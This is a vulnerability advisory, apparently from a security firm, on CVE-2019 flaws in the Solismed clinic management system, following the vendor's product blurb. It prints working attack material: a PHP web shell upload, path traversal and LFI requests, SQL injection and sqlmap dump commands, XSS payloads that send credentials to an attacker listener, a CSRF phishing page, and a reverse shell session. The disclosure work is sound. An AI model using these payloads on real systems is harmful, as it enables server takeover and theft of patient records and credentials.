* # Optimize Your Healthcare Business

  ## Solismed is a super efficient practice management system designed for use by clinics, wellness centers, rehabilitation facilities, senior homes, and small hospitals.

  Watch an Intro Video

  Start Using Solismed

## One Integrated System

Appointment scheduling, patient care management, e-prescribing, electronic health records, inventory control, billing, and patient portal are all parts of the same system.

## Amazing Features

Solismed is great for multi-tasking (such as opening multiple patient encounters) and team collaboration (such as accessing the same patient records on an exam room computer).

## 100% Data Ownership

Have full control of your patient data and share it with no one, unlike what happens when you subscribe to a service that sells or manipulates your patient data for profits.

## High-end Administration

All of the configurations can be done in the user interface to meet your needs. Some of the functions, such as screen display, can also be set according to individual preferences.

## Browser Based

You can host the system in the cloud or on a desktop computer. Any HTML5 compatible browser can be used, including Chrome, Edge, Brave, Firefox, and Safari.

## Reliable and Secure

Built to meet HIPAA requirements. For example, the patient data is encrypted and secured through a number of cryptography algorithms. Work well with SSL certificate (https:// access).

## Free and Paid Licenses

You can deploy the system on your own (starting with 5 free active users) or sign up for our hosted solution. There is no limitation on how you can use the system.

## Customizable Solutions

If the system doesn't fully meet your needs, you can hire us to make changes and add more features to it. We will do our best to make it work better for you.

## Professional Support

Paid users receive full and continuous support via Solismed Helpdesk; free users receive limited installation and startup help with the option to pay for specific support services.

## VULNERABILITIES

## Insecure File Upload

| CVE ID | Security Risk | Impact | Access Vector |
| --- | --- | --- | --- |
| CVE-2019-15936 | Critical | Code execution | Remote |

The Solismed application was affected by one instance of insecure file upload that allowed unauthenticated users to upload arbitrary files, including PHP files, that were stored within the application's web root. The insecure file upload resulted in remote code execution (RCE) from the context of an external unauthenticated attacker.

The `/gui/file_upload.php` endpoint did not require authentication or authorization and was used by the Solismed application to handle file uploads. This file upload handler relied on client-side controls to restrict dangerous file types from being uploaded to the application server. To bypass the client-side controls, a direct `POST` request containing a PHP web shell was sent, as shown below:

```
POST /gui/file_upload.php?delete_after_upload=N&use_real_file=Y&user_id=4&patient_id=&encounter_id=0&encrypt=N⌖_folder=preferences HTTP/1.1
Host: localhost
…omitted for brevity…
-----------------------------2097450045574358816674343
Content-Disposition: form-data; name="name"

rce.php
-----------------------------2097450045574358816674343
Content-Disposition: form-data; name="file"; filename="rce.php"
Content-Type: image/png

<?php
    if(isset($_GET['cmd']))
    {
        system($_GET['cmd']);
    }
?>
-----------------------------2097450045574358816674343--
```

***FIGURE 1** - PHP file upload*

The application processed the request, responded with a `200` OK message, and returned the filename assigned by the application, as shown below:

```
HTTP/1.1 200 OK
…omitted for brevity…
{"jsonrpc":"2.0","result":null,"id":"id","realfileName":"rce.php","fileName":"1-4--0-aabee-rce.php","file_content":"iVBORw0KGgo8P3BocA0KICAgIGlmKGlzc2V0KCRfR0VUWydjbWQnXSkpDQogICAgew0KICAgICAgICBzeXN0ZW0oJF9HRVRbJ2NtZCddKTsNCiAgICB9DQo\/Pg0KCYI="}
```

***FIGURE 2** - Application response*

Navigating to the `/webroot/userhome/preferences` endpoint with the fileName parameter value returned in the response revealed the PHP web shell uploaded successfully and accepted operating system commands on the application server, as shown below:

![Solismed-3](https://assets.bishopfox.com/prod-1437/Documents/Solismed-3-new-pic.png)

******FIGURE 3**** **-** PHP web shell showing contents of* `/etc/passwd`*

The PHP web shell ran in the context of the application server's www-data user. To automate the exploitation of this issue, a python script was created that allowed the team to upload an interactive web shell in a single command, as shown below:

![Solismed-4](https://assets.bishopfox.com/prod-1437/Documents/Solismed-4-new-pic.PNG)

******FIGURE 4**** **-** Automated file upload exploitation**

The web shell granted the ability to exfiltrate sensitive data, such as patients' medical records, and would grant an attacker a foothold on the internal network. The testing and exploit code can be found in Appendix A following this advisory.

## Local File Inclusion (LFI)

The Solismed application was affected by one instance of LFI resulting in unauthenticated remote code execution and disclosure of arbitrary files from the underlying server.

| CVE ID | Security Risk | Impact | Access Vector |
| --- | --- | --- | --- |
| CVE-2019-16246 | Critical | Code execution | Remote |

The `/gui/file_viewer.php` endpoint was vulnerable to LFI. Appending file paths to the uloaded\_filename parameter processed the targeted file by including its contents in a temporary directory within the application's web root to be displayed by Google Docs. The LFI request is shown below:

```
GET /gui/file_viewer.php?encrypt=N⌖_folder=utilities&uploaded_filename=../../../../../../../etc/passwd HTTP/1.1
Host: 192.168.1.7
```

***FIGURE 5** - Path to* `/etc/passwd`

The `GET` request returned a `302` redirect message and attempted to display the local file in a Google Docs file viewer. For the local file to be processed in this manner, localhost could not be used as a target URL in the initial LFI request, as it would not be processed by the Google Doc functionality. The `302` from the Google Doc functionality is shown below:

```
HTTP/1.1 302 Found
…omitted for brevity…
Location: https://docs.google.com/viewer?url=http%3A%2F%2F192.168.1.7%2Fwebroot%2Ftemp%2F2aab195e7894861ae10b3015391c45f6.&embedded=true
Content-Length: 0
```

***FIGURE 6** - Location header containing vulnerable endpoint*The redirect contained a url parameter that was the processed file's location. By navigating to the URL in the url parameter of the location header, the contents of /etc/passwd were returned, as shown below:

![Solismed-7](https://assets.bishopfox.com/prod-1437/Documents/Solismed-7-new-pic.PNG)

************FIGURE 7******** ******-****** Contents of* **`/etc/passwd`*****

Additionally, the LFI included local PHP files resulting in code execution. To automate exloitation, a script was created that chained the LFI with the insecure file upload, resulting in unauthenticated remote code execution, as shown below:

![Solismed-8](https://assets.bishopfox.com/prod-1437/Documents/Solismed-8-new-pic.PNG)

******FIGURE 8**** **-** LFI code execution**

An attacker could leverage this vulnerability to compromise the underlying server and/or exfiltrate sensitive data.

## SQL Injection

The Solismed application was affected by four instances of SQL injection that resulted in unauthenticated exposure of the data contained within the application MySQL database, including medical records, Social Security numbers, application user data, and PII.

| CVE ID | Security Risk | Impact | Access Vector |
| --- | --- | --- | --- |
| CVE-2019-15933 | High | Information disclosure | Remote |

The `/schedule/loaders/check_datetime.php` endpoint was vulnerable to SQL injection. This endpoint required no authentication or authorization. To determine that the endpoint was vulnerable to SQL injection, a request was sent containing a sleep command in the date parameter, as shown below:

```
POST /schedule/loaders/check_datetime.php HTTP/1.1
Host: localhost
…omitted for brevity…
calendar_id=&date=09%2f03%2f2019'%2b(select*from(select(sleep(10)))a)%2b'&patient_id=21&provider_id=0&form_location_id=1&day=2&start_time=990&end_time=1024
```

***FIGURE 9** - SQL sleep command sent to server*

The application delayed ten seconds, indicating a SQL injection vulnerability. To further exploit this issue, the automated SQL injection tool sqlmap was used with the command `sqlmap -l sql-check.txt --dbms=mysql --thread=4 -p date - dump` , where `/sql-check.txt` is the vulnerable `POST` request. The result of this command was the exfiltration of the entire Solismed application database. A sample of the exfiltrated tables is shown below:

![Solismed-10](https://assets.bishopfox.com/prod-1437/Documents/solismed-10-new-pic.png)

**********FIGURE 10****** ****-**** Sample of tables exfiltrated from SQL injection****

The database contained sensitive PII and medical records as well as application user data. Some of the more sensitive data was encrypted with AES, as shown below:

![Solismed-11](https://assets.bishopfox.com/prod-1437/Documents/Solismed-11-new-pic.PNG)

***FIGURE 11** - Encrypted data in demographics table*

However, an attacker could decrypt all of the encrypted data using methods described in the Insecure Cryptographic Storage finding in this advisory. Additionally, the SQL injection could be used to retrieve files from the underlying filesystem and, in some instances, could lead to remote code execution if the database user had write permissions in the web root.

### Additional Affected Locations

* `/finance/sales/load_details.php`
  + Parameter: `payment_id`
* `/index.php?loginaction=login`
  + Referer header – Note: requires valid credentials to be sent in login
* `/schedule/loaders/*`
  + Multiple parameters

## Cross-site Scripting (XSS)

The Solismed application was affected by systemic cross-site scripting (XSS), including both stored and reflected XSS. The stored XSS could be exploited by any authenticated user, including the low-privilege patient application users, and affected staff users including administrators. The reflected XSS could be exploited by unauthenticated users and affect any Solismed user that could be lured into clicking a link. The XSS was exploited to obtain sensitive personal information, such as Social Security numbers, as well as to obtain valid login credentials to the application. Additionally, the XSS was chained with the CSRF and Insecure File Upload findings of this advisory to achieve remote code execution and compromise the underlying server.

| CVE ID | Security Risk | Impact | Access Vector |
| --- | --- | --- | --- |
| CVE-2019-15935 | High | Escalation of privileges &Information disclosure | Remote |

To demonstrate how an attacker may exploit these issues, as well as the impact of the finding, a stored XSS was exploited from the context of a low-privileged patient user. This XSS affected staff users, including administrators, and exfiltrated sensitive patient information such as cleartext Social Security numbers. The reflected XSS was exploited from the context of an unauthenticated user and affected any user who could be enticed to click a link. When the link was clicked, cleartext credentials of the victim user were sent to the attacker's server.

#### **Stored XSS**

To exploit the stored XSS, an attacker would authenticate as a low-privilege patient user to update the patient address (though all fields were vulnerable) to contain an arbitrary XSS payload, as shown below:

```
POST /index_body.php?module=patient_portal&tab=account_settings&mount= HTTP/1.1
Host: localhost
…omitted for brevity…
Content-Disposition: form-data; name="address1"

<script>jQuery.getScript("http://localhost:9090/e.js")</script>
-----------------------------65865042617418668151654240944
…omitted for brevity…
```

***FIGURE 12** - XSS payload within the address1 parameter*

This arbitrary JavaScript executed whenever a staff or administrative user navigated to the affected patients' file at the `index_page.php` endpoint. Once a staff member navigated to the affected endpoint, the XSS triggered and loaded `e.js` (a JavaScript payload) from the attacker server. The `e.js` payload retrieved all patients’ existing PII data, including cleartext Social Security numbers, and sent them to the attacker server, as shown below:

![Solismed-13](https://assets.bishopfox.com/prod-1437/Documents/Solismed-13-new-pic.PNG)

*****FIGURE 13** - Sensitive PII data returned to attacker server***

Since this instance of XSS was stored, the attacker could persistently obtain sensitive medical and PII data.

#### **Reflected XSS**

To demonstrate the reflected XSS, the `/contacts/patients/loaders/upload_webcam_file.php` endpoint was exploited. A malicious link was crafted that contained arbitrary JavaScript in the `patient_id` parameter, as shown below:

```
http://localhost/contacts/patients/loaders/upload_webcam_file.php?patient_id=0%3cscript%3eeval(String.fromCharCode(102,…omitted for brevity…59))%3c%2fscript%3e
```

***FIGURE 14** - XSS link*

The payload was encoded to avoid issues with the application’s handling of special characters. The full decoded payload is shown below:

```
// XSS payload for Solismed v3.3sp1
// Obtains logged in user credentials
fetch('/index_body.php?module=preferences&tab=account&mount=user_settings', {
    credentials: 'include'
}).then(function (response) {
    return response.text().then(function (html) {
        var parser = new DOMParser();
        var doc = parser.parseFromString(html, "text/html");
        let passwd = doc.getElementById("password").value;
        let uname = doc.getElementById("username").value;
        let creds = `UsernameFound: ${uname} PasswordFound: ${passwd}`
        return creds
    });
}).then(function (creds) {
        fetch('http://localhost:1337', {
            method: 'POST',
            body: creds
        })
});
```

***FIGURE 15** - XSS payload to receive credentials*

If an authenticated application user was lured into clicking the affected link, the payload executed, pulled cleartext credentials from the victim user's profile page, and sent them to the attacker server, as shown below:

```
nc -lvvp 1337
…omitted for brevity…
UsernameFound: admin PasswordFound: sysadmin
```

***FIGURE 16** - Cleartext credentials received at attacker server*

The attacker could now authenticate to the application as the victim user. Because cross-site scripting was systemic within the Solismed application, it is not practical to list all affected locations.

## Cross-Site Request Forgery (CSRF)

The Solismed application was affected by systemic CSRF that could be exploited from the context of an external unauthenticated user to create back-doored users, change passwords of users without knowledge of the original, or make any state-changing request on behalf of authenticated users. In this instance, the CSRF was exploited to demonstrate how an unauthenticated external attacker with no direct access to the application (i.e., the application was hosted on an internal network, not publicly facing) could gain remote code execution (RCE) through a chain of vulnerabilities (CSRF => XSS => Incorrect Access Controls => Insecure File Upload).

| CVE ID | Security Risk | Impact | Access Vector |
| --- | --- | --- | --- |
| CVE-2019-15934 | High | Escalation of privileges | Remote |

An externally hosted phishing page was created so that when visited by an authenticated staff user on the Solismed application, the page forced the user to send a `POST` request to the Solismed application on behalf of the authenticated user. The HTML/JavaScript that sent the `POST` request is shown below:

```
<html>
    <body>
        <script>
            var payload = '<img src=x onerror=jQuery.getScript("http://localhost:9090/xss-shell.js")>'
            var formData = new FormData();
            formData.append('task', 'save');
            formData.append('first_name', payload);
                    fetch('http://localhost/index_body.php?module=contacts&tab=Charts&mount=demographics&patient_id=&mounttype=default&tab_id=&calendar_id=®istration_id=☎_call_id=&from_finance=', {
            credentials: 'include',
            method: 'POST',
            body: formData
        });
        </script>
    </body>
</html>
```

***FIGURE 17** - CSRF phishing page code*

This CSRF payload was designed to chain with the Stored XSS finding described in this advisory. Once an authenticated staff member visited the phishing page, an arbitrary request was sent on their behalf that added a new patient with the patient's name containing an XSS payload, as shown below:

```
POST
/index_body.php?module=contacts&tab=Charts&mount=demographics&patient_id=&mounttype=default&tab_id=&calendar_id=®istration_id=☎_call_id=&from_finance= HTTP/1.1
Host: localhost
…omitted for brevity…
origin: null
…omitted for brevity…
Content-Disposition: form-data; name="first_name"

<img src=x onerror=jQuery.getScript("http://localhost:9090/xss-shell.js")>
-----------------------------6992918915940625501117424983—
```

***FIGURE 18** - CSRF request to create new patient*

The affected patient name was stored in the `index_page.php` on the contacts – patients endpoint. Once any authenticated staff member viewed the affected patients functionality, the stored XSS executed and loaded `xss-shell.js` from the attacker server. The `xss-shell.js` was a JavaScript payload that chained the incorrect access controls with the insecure file upload vulnerabilities described in this advisory, which resulted in a PHP reverse shell returned to the attacker, as shown below:

```
nc -lvvp 31337
listening on [any] 31337 ...
connect to [127.0.0.1] from localhost [127.0.0.1] 53014
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)

```

***FIGURE 19** - CSRF request to create new patient*

The PHP reverse shell allowed for operating system commands to be run on the application’s underlying server. The code for `xss-shell.js` is contained in Appendix A of this advisory.

## Incorrect Access Controls

The Solismed application was affected by systemic incorrect access controls that resulted in the unintended exposure of application functionality and data. The incorrect access controls resulted in the ability to exploit the insecure file upload and SQL injection findings of this advisory from the context of an unauthenticated attacker. The incorrect access controls allowed a low-privilege user to escalate permissions to the role of a system administrator. In addition to these issues, the application exposed sensitive data such as patient lists with corresponding contact information, application users, and medical records.

| CVE ID | Security Risk | Impact | Access Vector |
| --- | --- | --- | --- |
| CVE-2019-15932 | High | Information disclosure & Escalation of privileges | Remote |

As the Insecure File Upload and the SQL injection findings have already detailed the dangerous functionality exposed to unauthenticated attackers, the details of this finding will focus on the exposure of sensitive data to unauthenticated attackers and a privilege escalation vulnerability.

#### Unauthenticated Data Exposure

The Solismed application endpoints systemically did not enforce authentication or authorization aside from the `index*.php` endpoints. These endpoints contained publicly exposed sensitive data, such as patient information, health care records, application user information, a verbose error log, and SQL database information. Navigating to the `/contacts/patients/grids/all_patients.php` endpoint revealed all existing patients, names, dates of birth, phone numbers, and application-specific medical record numbers, as shown below:

![Solismed-20](https://assets.bishopfox.com/prod-1437/Documents/Image-20-new.PNG)

***FIGURE 20** - Sensitive data retrieved from* `all_patients.php` *endpoint*

To demonstrate the amount of data exposed and to automate testing, a Python script was created to retrieve the various exposed endpoints and write them into local files on the attacker server, as shown below:

![Solismed-21](https://assets.bishopfox.com/prod-1437/Documents/Solismed-21-new-pic.PNG)

***FIGURE 21** - Automated data exfiltration*
**Privilege Escalation**

The functionality to alter application roles did not properly enforce authentication. By sending a direct request to the `role` update endpoint, the application allowed any application user to escalate from any role to application system administrator. Sending the following request with the `form_user_id` set to the ID of the targeted user and the `form_user_role` set to 1 (the default value for the administrative role) resulted in vertical privilege escalation, as shown below:

```
POST /index_body.php?module=operations&tab=user_access&mount=user_accounts&tab_id=operations_edit_acc_19 HTTP/1.1
Host: localhost
…omitted for brevity…

```

***FIGURE 22** - Request made to escalate privilege*

The user could then refresh or re-authenticate with newly assigned administrative permissions, as shown below:

![Solismed-23](https://assets.bishopfox.com/prod-1437/Documents/Solismed-23-new-pic.PNG)

 ***FIGURE 23*** *- Newly assigned system admin role*

To perform the privilege escalation, the attacker can authenticate as any user to the Solismed application.

## Directory Traversal

The Solismed application was affected by two instances of directory traversal resulting in file uploads being written to arbitrary locations within the application’s web root. This could be used in conjunction with the insecure file upload vulnerability to achieve remote code execution in instances where the legitimate upload endpoint was unknown or restricted.

| CVE ID | Security Risk | Impact | Access Vector |
| --- | --- | --- | --- |
| CVE-2019-15931 | Medium | Arbitrary file write to application web root | Remote |

In the file upload detailed in the Insecure File Upload finding of this advisory, the `target_folder` parameter in the `/gui/file_upload.php` endpoint was vulnerable to directory traversal. By modifying the parameter to arbitrary locations within the web root, an attacker could control where the file was uploaded, as shown below:

```
POST /gui/file_upload.php?delete_after_upload=N&use_real_file=Y&user_id=400&patient_id=&encounter_id=0&encrypt=N⌖_folder=../../webroot HTTP/1.1
Host: 192.168.1.7
…omitted for brevity…
-----------------------------42781671320636923501375223656
Content-Disposition: form-data; name="name"

<?php
    if(isset($_GET['cmd']))
    {
        system($_GET['cmd']);
    }
?>

-----------------------------42781671320636923501375223656--

```

***FIGURE 24** - Directory traversal in file upload*

The directory traversal successfully uploaded the PHP web shell into the /webroot directory, resulting in remote code execution, as shown below:

![Solismed-25](https://assets.bishopfox.com/prod-1437/Documents/Solismed-25-newimage.PNG)

********FIGURE 25**** **-** Web shell in arbitrary file location****

The directory traversal further increases the exploitability of the insecure file upload, lowering the bar for the application architecture knowledge required to exploit this vulnerability.

**Additional Location**

* `/index_body.php`
  + Multiple parameters wherever filenames are present

## Insecure Cryptographic Storage

The Solismed application improperly implemented AES encryption to protect stored data within the application SQL database. An attacker could decrypt all of the encrypted data within the SQL database.

| CVE ID | Security Risk | Impact | Access Vector |
| --- | --- | --- | --- |
| CVE-2019-17428 | Medium | Information disclosure & Arbitrary actions forced on behalf of user | Local |

Once an attacker exfiltrated the data in the SQL database through the various exploits detailed in this advisory, the AES-encrypted data could be decrypted. The path of least resistance to decrypt all of the SQL data was through misuse of application functionality. As detailed in the XSS finding of this advisory, the data, such as usernames and passwords, rendered in cleartext within the application’s UI. This demonstrated that the application was decrypting the SQL data for display in the UI. Therefore, to decrypt the encrypted SQL data, an attacker could download the publicly available Solismed application and insert the encrypted contents into fields that would be displayed by the UI, as shown below:

![Solismed-26](https://assets.bishopfox.com/prod-1437/Documents/Solismed-26-new-image.PNG)

******FIGURE 26**** **-** Decryption on AES SQL data**

This was verified across different installations of Solismed, indicating that the AES decryption key was hard-coded into the application source code across all installations. The AES key was not retrieved during the course of the testing due to the source code's IonCube protection and the time-boxed nature of this test.

## User Interface Redress (Clickjacking)

The Solismed application lacked application framing protections, resulting in a user interface redress (UI Redress) vulnerability that allowed the application to be framed within a phishing page that an attacker could use to hijack user clicks and execute arbitrary actions on their behalf. To demonstrate impact, clickjacking was added to the attack chain described in the CSRF finding of this advisory (CSRF => XSS => UI Redress => Incorrect Access Controls => Insecure File Upload). Through the UI redress vulnerability, an attacker could force the execution of the XSS vulnerability, resulting in code execution on the underlying server through the chain of vulnerabilities described.

| CVE ID | Security Risk | Impact | Access Vector |
| --- | --- | --- | --- |
| CVE-2019-15930 | Low | Arbitrary actions forced on behalf of the user | Remote |

Framing the Solismed application in a phishing page that included the CSRF payload allowed for an attack chain of CSRF => XSS => Clickjacking => Incorrect Access Controls => Insecure File Upload => RCE to be executed from the context of an external unauthenticated attacker. The phishing page is shown below:

******FIGURE 27**** **-** UI redress phishing page**

When an authenticated user navigated to the phishing page, the CSRF would trigger, exploiting the XSS as described in the CSRF finding of this advisory. The Solismed application would then be framed within the phishing page. If the victim user's start page was patient contacts (as was the case with some of the preconfigured test accounts within the software download), no click was required and the XSS triggered, resulting in RCE. In instances where the victim user's start page was not the patient contacts endpoint, one click was required to load the XSS-affected endpoint. The code used in the phishing page can be found in Appendix A below.
